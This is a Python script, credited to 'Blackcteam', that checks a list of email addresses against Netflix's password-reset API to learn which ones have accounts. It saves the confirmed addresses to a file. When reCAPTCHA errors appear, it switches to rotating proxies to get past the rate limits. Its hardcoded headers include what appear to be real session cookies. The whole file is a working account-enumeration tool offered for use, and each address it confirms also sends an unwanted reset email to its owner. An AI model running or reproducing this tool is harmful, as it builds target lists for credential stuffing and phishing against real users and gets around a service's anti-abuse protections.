import requests, time, sys, os
from colorama import init, Fore
import threading
from concurrent.futures import ThreadPoolExecutor
from proxycheck import read_proxies_from_file, check_proxy
init()

green = Fore.GREEN
white = Fore.WHITE
red = Fore.RED
yellow = Fore.YELLOW
blue = Fore.BLUE

print()
if os.name == 'nt': 
    os.system('cls')
elif os.name == 'posix':
    os.system('clear')
print(blue+ '''
      
      Coded by Pop(G)
                    Blackcteam
      ''')
print()

url = 'https://www.netflix.com/api/shakti/mre/login/help'



def netflix(email, name, used_proxies):
    headers = {
        'Host': 'www.netflix.com',
        'Cookie': 'flwssn=640474f3-4b7e-4df0-b23b-00d3d55de38a; nfvdid=BQFmAAEBEEFaRpMucg14B1NjhPhFUPVAWeOd_Zb1BEsvgJtPy7MtIrL_3ir9RvEfW60WdgkIqP04g2Y4qkKoXWEGSWiyZxDAfHCP57qjbcq9cKC7njMa1g%3D%3D; SecureNetflixId=v%3D2%26mac%3DAQEAEQABABQZUA8T8AhMETrAqwZXtu5N-u_dLlWH0cE.%26dt%3D1694557740265; NetflixId=v%3D2%26ct%3DBQAOAAEBEFGebBrXCUAPTRvxG6oxtmiBAJ7apG5zsN6oP99BdGp4ExD66aFHRdMCYdbdVokYk2MDhqdeKrTyjpZS2otZML21F6rq2PAxGAumy0uF03oCfOagUJZQNmZELxpvO8bOVgTE4A1sByvj8PGw_ECo8APxIEMWxyyokSTdCZTcrnteQGmRfIWgwfJ5Ll99aDwgt70-KIbI5vMtkbbPDcOKCDXOxxUqb2WKdRaYMoX5miKKv_U2znExnlJWdvmcPBxO1-65ZrQnsr1Qio4ETTiLWTTURamGPASBlgdSrUKtp5YJjI7wyIaQb36ivgVvZc7nCUkHL5KILk799fkmif1a6gQsf7wXa__0NTCaTzvQRHpnNuA.%26bt%3Ddev%26mac%3DAQEAEAABABTIDgRQOo4JYaXaJOSpzab98-aKseKYYVo.; OptanonConsent=isGpcEnabled=0&datestamp=Tue+Sep+12+2023+18%3A29%3A42+GMT-0400+(Eastern+Daylight+Time)&version=202301.1.0&isIABGlobal=false&hosts=&consentId=cb1b423b-c216-4081-a9ca-515c33dea581&interactionCount=1&landingPath=https%3A%2F%2Fwww.netflix.com%2Fng%2FloginHelp&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1',
        # Add other headers here
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'X-Requested-With': 'XMLHttpRequest',
        'X-Netflix.client.request.name': 'ui/xhrUnclassified',
        'Origin': 'https://www.netflix.com',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.netflix.com/ng/loginHelp',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9'
    }

    payload = {
        "fields": {
            "forgotPasswordChoice": {"value": "email"},
            "email": email,
            "recaptchaResponseToken": "",
            "recaptchaError": "RESPONSE_TIMED_OUT",
            "recaptchaResponseTime": "2505"
        },
        "mode": "enterPasswordReset",
        "action": "nextAction",
        "authURL": "1694557779691.4VrMqdMwnS99X7y5vd2NvpRu4cA="
    }

    # print(response.json())
    try:
        response = requests.post(url, headers=headers, json=payload)
        # print(response.text)
        if response.status_code == 200:
            if 'account_not_found'  in response.text:
                print(red + f'Invalid ==> {email}')
                
            elif 'recaptchaError' in response.text:
                print('CAPTCHA ERROR started, proxies needed.. ')
                proxy(headers, payload, email, name, used_proxies)
                                            
                
            elif 'confirmPasswordResetEmailed' in response.text:
                with open(name, 'a') as valid:
                    # print(response.text)
                    print()
                    valid.write(f'{email}\n')
                    # save.write(f"{number}\n")
                    print(green + f'Valid ==> {email}')
            else: 
                print('Unknown error ...')
                
            # else:
        else:
            print('Server error, please notify the Provider')
    except Exception as e:
        print(e)



def proxy(headers, payload, email, name, used_proxies):
    print('connecting to proxies ...')
    # time.sleep(1)
    with open('conf/validproxies.config', 'r') as x:
        proxies = x.readlines()
        for proxy in proxies:
            proxy = proxy.strip()
            if proxy in used_proxies:
                continue  # Skip this proxy if it has already been used
            proxiess = {
                "http": f"http://{proxy}",
                "https": f"http://{proxy}"
            }
            used_proxies.add(proxy)
            try:
                response = requests.post(url, headers=headers, json=payload, proxies=proxiess, timeout=5)
                  
                if response.status_code == 200:
                    if 'account_not_found' in response.text:
                        print(red + f'Invalid ==> {email}')
                    elif 'confirmPasswordResetEmailed' in response.text:
                        with open(name, 'a') as valid:
                            print()
                            valid.write(f'{email}\n')
                            print(green + f'Valid ==> {email}')
                    elif 'recaptchaError' in response.text:
                        print(red + f'Error with proxy {yellow+proxy}: recaptchaError')
                        
                else:
                    print(red + f'Error with proxy {yellow+proxy}:code {response.status_code}')
                break
                
            except Exception as e:
                print(red + f'Error with proxy {yellow+proxy}')
                break
            

def run():
    try:
        print('''
            
            [1] ==> With Proxies
            [2] ==> Without Proxies
            
            ''')
        option = input(': ')
        if option == "1":
            print(red+'Have you copy and paste your proxy to to proxies.config file?(Yes/No)')
            opt = input("(Yes/No): ")
            
            
            if opt.lower() == 'yes':
                print("Checking for the live proxies.....")
                # time.sleep(1)
                print()
                proxies_file_path = 'proxies.config'
                proxy_list = read_proxies_from_file(proxies_file_path)

                with ThreadPoolExecutor(max_workers=100) as executor:
                    for proxy in proxy_list:
                        executor.submit(check_proxy, proxy)
                try:
                    used_proxies = set()
                    file = input(yellow + "Enter path to netflix email list: ")
                    save_name = input(yellow + "Enter name to save the result: ")
                    print()
                    print()
                    with open(file, 'r') as read:
                        emails = read.readlines()
                        for email in emails:
                            email = email.strip()
                            
                            netflix(email, save_name, used_proxies)
                        
                except KeyboardInterrupt:
                    print()
                    print()
                    print(red + "Thank for you time....")
                    time.sleep(1)
            elif opt.lower() == 'no':
                print()
                print("Please do that and try again...")
                sys.exit()
            else:
                print("Invalid input.... try again")
                sys.exit()
        elif option == '2':
            try:
                used_proxies = set()
                file = input(yellow + "Enter path to netflix email list: ")
                save_name = input(yellow + "Enter name to save the result: ")
                print()
                print()
                with open(file, 'r') as read:
                    emails = read.readlines()
                    for email in emails:
                        email = email.strip()
                        
                        netflix(email, save_name, used_proxies)
                        
            except KeyboardInterrupt:
                try:
                    os.remove('conf/validproxies.config')
                    print()
                    print()
                    print(red + "Thank for you time....")
                    time.sleep(1)
                except:
                    pass
        else:
            print('Invalid input..')
            sys.exit()
        try:
            os.remove('conf/validproxies.config')
            print()         
        except:
            pass
    except KeyboardInterrupt:
        try:
            os.remove('conf/validproxies.config')
            print()
            print()
            print(red + "Thank for you time....")
            time.sleep(1)
        except:
            pass
if __name__ == '__main__':
    run()